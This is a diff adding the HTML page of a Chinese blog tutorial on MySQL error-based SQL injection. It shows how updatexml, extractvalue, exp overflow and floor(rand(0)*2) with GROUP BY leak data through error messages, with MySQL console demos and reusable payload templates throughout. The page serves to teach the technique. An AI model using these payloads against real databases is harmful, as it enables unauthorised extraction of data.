@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Vespera" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="Vespera&#39;s Blog" />
+  
+  
+  
+  <title>
+    
+      MySQL 报错注入总结 
+      
+      
+      |
+    
+     酒一杯
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="酒一杯" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Vespera</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">MySQL 报错注入总结</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-03-31 00:12:46
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Websec/" title="Websec">
+                    <b>#</b> Websec
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/SQLi/" title="SQLi">
+                    #SQLi
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>报错注入指通过<br>而显示错误则需要在开发程序中采用 <code>print_r mysql_error()</code> 函数，将 MySQL 错误信息输出。</p>
+<h1 id="xpath-报错"><a href="#xpath-报错" class="headerlink" title="xpath 报错"></a>xpath 报错</h1><hr>
+<p>Mysql 从 <strong>5.1.5</strong> 版本开始，MySQL 提供了两个用于<strong>查询和修改 XML 的函数</strong>：<code>updatexml</code> 和 <code>extratvalue</code>. 前者负责修改查询到的内容，后者负责在 XML 文档中按照 XPATH 语法查询节点内容。</p>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><h3 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h3><p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code>：Return replaced XML fragment.</p>
+<ul>
+<li><code>xml_target</code>：给定的 XML 标记片段。</li>
+<li><code>xpath_expr</code>：用户提供的 XPATH 表达式，即要修改的 XML 片段路径。</li>
+<li><code>new_xml</code>：要替换的新 XML 片段。</li>
+</ul>
+<p>函数功能：将 <code>xml_target</code> 中与 <code>xpath_expr</code> 相匹配的部分替换为给定的 <code>new_xml</code>，然后返回更改后的 XML.<br>如果没有发现匹配 <code>xpath_expr</code> 参数的表达式，或找到多个匹配项，则返回原始的 xml_target 片段。三个参数均为字符串，若其中任何一个为 NULL，则函数返回 NULL. </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>,<span class="string">&#x27;&lt;d&gt;ddd&lt;/d&gt;&#x27;</span>) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">value</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>d<span class="operator">&gt;</span>ddd<span class="operator">&lt;</span><span class="operator">/</span>d<span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Error handling</strong>：使用的 XPath 定位器必须有效，并且要搜索的 XML 必须由正确嵌套和闭合的元素组成。如果定位器无效，则会生成错误：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/&amp;a&#x27;</span>,<span class="string">&#x27;&lt;d&gt;d&lt;/d&gt;&#x27;</span>) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&amp;a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h3><p>利用 <code>updatexml</code> 的报错处理机制，当参数 <code>xpath_expr</code> 为&#x3D;&#x3D;不合法的 XPATH 表达式&#x3D;&#x3D;时，系统将以报错形式返回我们输入的具体不符合规范的字符串。</p>
+<p>一般利用 <code>updatexml</code> 报错注入的 paylaod 如下，需要将要查询的语句写在 <code>xpath_expr</code> 参数处，并使用 <code>concat</code> 函数&#x3D;&#x3D;拼接不合法的 XPATH 字符&#x3D;&#x3D;。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,@<span class="variable">@version</span>,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.7.26~&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>0x7e 是 16 机制的波浪符 <code>~</code>，除此之外，不合法的 XPATH 字符包括但不限于：</p>
+<ul>
+<li>单引号(0x27) 和双引号(0x22).</li>
+<li>反斜杠(0x5c).</li>
+<li>小括号(0x28, 0x29).</li>
+<li>其它特殊字符：冒号(0x3a)、星号(0x2a)等。</li>
+</ul>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p><code>Extractvalue(xml_frag, xpath_expr)</code>: Extract a value from an XML string using XPath notation.</p>
+<ul>
+<li><code>xml_frag</code>：包含 XML 标记的字符串片段。</li>
+<li><code>xpath_expr</code>：XPATH 表达式(locator).</li>
+</ul>
+<p>函数功能：返回第一个文本节点的 CDATA，即在 <code>xml_frag</code> 中定位 <code>xpath_expr</code> 相应的 XML 元素或节点。</p>
+<ul>
+<li>CDATA(Character Data)：在 XML 中，CDATA 是一种特殊的标记，用于包含文本数据，而不对其中的特殊字符进行转移。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;test&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a/b&#x27;</span>) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> test  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br></pre></td></tr></table></figure>
+
+<p>其报错原理与 <code>Updatexml()</code> 相同。</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,@<span class="variable">@version</span>,<span class="number">0x7e</span>)) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.7.26~&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h1><hr>
+<p>EXP 函数为 Double 型溢出，关于溢出原理可以看 [[基于 BIGINT 溢出错误的 SQLi|BIGINT 整型溢出]]。</p>
+<p><code>Exp(X)</code>: 返回 e 的 X 次方值。当 <strong>X 大于 709</strong> 时，会发生溢出报错。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">709</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">exp</span>(<span class="number">709</span>)              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.218407461554972e307</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">710</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(710)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>与 BIGINT 溢出相同，通过取反符造成溢出。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(~((select &#x27;</span>root<span class="variable">@localhost</span><span class="string">&#x27; from dual)))&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!hint]<br>在 MySQL 5.5.53 之后，exp() 报错不再返回我们查询的结果。</p>
+</blockquote>
+<h1 id="floor-rand"><a href="#floor-rand" class="headerlink" title="floor() + rand()"></a>floor() + rand()</h1><hr>
+<h2 id="函数解释-1"><a href="#函数解释-1" class="headerlink" title="函数解释"></a>函数解释</h2><ul>
+<li><code>Floor(X)</code>：返回不大于 X 的最大整数值。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">1.68</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="number">1.68</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Rand([N])</code>：返回 0 &lt;&#x3D; v &lt; 1.0 范围内的随机浮点值 v. <ul>
+<li>如果没有指定参数 N，则返回一个 0 到 1 的随机浮点数。</li>
+<li>如果指定了参数 N，则其作为 seed. 每次调用都会生成相同的随机数序列，因此返回值在每次执行中都相同。</li>
+</ul>
+</li>
+</ul>
+<h3 id="floor-rand-0-2"><a href="#floor-rand-0-2" class="headerlink" title="floor(rand(0)*2)"></a><code>floor(rand(0)*2)</code></h3><p><code>rand(0)</code> 生成 0 &lt;&#x3D; 1 的伪随机数，乘 2 后返回 0 &lt;&#x3D; 2 的数，配合 <code>floor()</code> 就可以生成确定的两个数：0 和 1。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="group-by-与-count"><a href="#group-by-与-count" class="headerlink" title="group by 与 count(*)"></a><code>group by</code> 与 <code>count(*)</code></h3><p><code>group by</code> 语句用于将数据按照指定的列进行分组，<code>count(*)</code> 用于计算每个分组中的行数，当二者结合使用时，<code>group by</code> 与 <code>count(*)</code> 可以用来统计每个分组中的行数。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure>
+
+<p>二者连用时，MySQL 会创建一个<strong>虚表</strong>，用来暂时存储指定查询的列及其出现次数。<br>以下是 stus 表的原始数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> stus;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> gender <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> Amy   <span class="operator">|</span> W      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Tom   <span class="operator">|</span> M      <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Sam   <span class="operator">|</span> M      <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Sunny <span class="operator">|</span> W      <span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Frida <span class="operator">|</span> W      <span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br></pre></td></tr></table></figure>
+
+<p>调用 <code>group by gender</code>，依次根据 stus 表中的 gender 进行查询计数。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询第一行</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> Key   <span class="operator">|</span> <span class="keyword">Value</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> W     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="comment">-- 查询第二行</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> Key   <span class="operator">|</span> <span class="keyword">Value</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> W     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> M     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="comment">-- 查询第三行</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> Key   <span class="operator">|</span> <span class="keyword">Value</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> W     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> M     <span class="operator">|</span> <span class="number">2</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="报错原理-1"><a href="#报错原理-1" class="headerlink" title="报错原理"></a>报错原理</h2><blockquote>
+<p>Use of a column with <code>RAND()</code> values in an <code>ORDER BY</code> or <code>GROUP BY</code> clause may yield unexpected results because for either clause a <code>RAND()</code> expression can be evaluated multiple times for the same row, each time returning a different result.</p>
+</blockquote>
+<p>当我们在 group by 子句中使用 rand 时，会产生报错，原因是该语句违反唯一性约束。具体来说，MySQL 尝试将结果集按照 <code>floor(rand(0)*2)</code> 的结果进行分组，但在结果集中，存在多个行具有相同的 <code>floor(rand(0)*2)</code> 值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;&lt;group_key&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>去掉 rand 函数中的 seed 试验，不会每次都报错。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;&lt;group_key&gt;&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="报错原因分析"><a href="#报错原因分析" class="headerlink" title="报错原因分析"></a>报错原因分析</h3><p>根据上文分析，<code>floor(rand(0)*2)</code> 会产生一个确定的 01 序：01101… </p>
+<ol>
+<li>查询第一行：<code>floor(rand(0)*2)</code> 执行一次，结果为 0，查询虚表发现不存在主键 0，此时 <code>floor(rand(0)*2)</code> 再次被计算，结果为 1，插入虚表。</li>
+<li>查询第二行：<code>floor(rand(0)*2)</code> 结果为 1，而虚表中存在主键 1，所以 <code>floor(rand(0)*2)</code> 不会被计算第二次。</li>
+<li>查询第三行：<code>floor(rand(0)*2)</code> 结果为 0，查询虚表，没有主键 0，于是数据库尝试插入一条新的数据，<strong>在插入数据时<code>floor(rand(0)*2)</code> 被再次计算</strong>，结果 1 作为虚表的主键，早造成主键重复。</li>
+</ol>
+<h3 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h3><blockquote>
+<p><code>group by</code> 在向虚表插入数据时，由于 <code>rand()</code> 多次计算导致虚表主键重复从而报错，又因为报错前 <code>concat()</code> 中的 SQL 语句或函数被执行，所以该语句报错且被抛出的主键是 SQL 语句或函数执行后的结果。</p>
+</blockquote>
+<p>将想要查询的语句通过 <code>concat</code> 函数与 <code>floor</code> 语句拼接在一起使之报错。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br><span class="line"><span class="comment">-- 下一句是上一句的变形</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span>(concat(<span class="number">0x7e</span>,(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)),<span class="number">0x7e</span>,database()));</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;~1~security&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;&lt;group_key&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs"></a>Refs</h1><hr>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en">MySQL 8.0 Reference Manual</a></li>
+<li><a target="_blank" rel="noopener" href="https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/">Error Based SQL Injection Using EXP | 🔐Blog of Osanda</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849">如何使用 MySQL exp() 函数进行 Sql 注入</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hellomao.top/2019/08/16/web_mysql_floor/">mysql的floor()报错注入方法详细分析 | 小friend的博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/#group-by-floor-%E6%8A%A5%E9%94%99mysql-5-%E5%8F%AF%E7%94%A8%E9%87%8D%E5%A4%8D%E9%94%AE%E6%8A%A5%E9%94%99">SQL注入 - ro0t</a></li>
+<li><a target="_blank" rel="noopener" href="https://flyingfox092.github.io/2021/07/15/floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">floor报错注入原理分析 | 江城子同学</a></li>
+</ol>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-03-31 00:12:46
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Websec/" title="Websec">
+                        <b>#</b> Websec
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
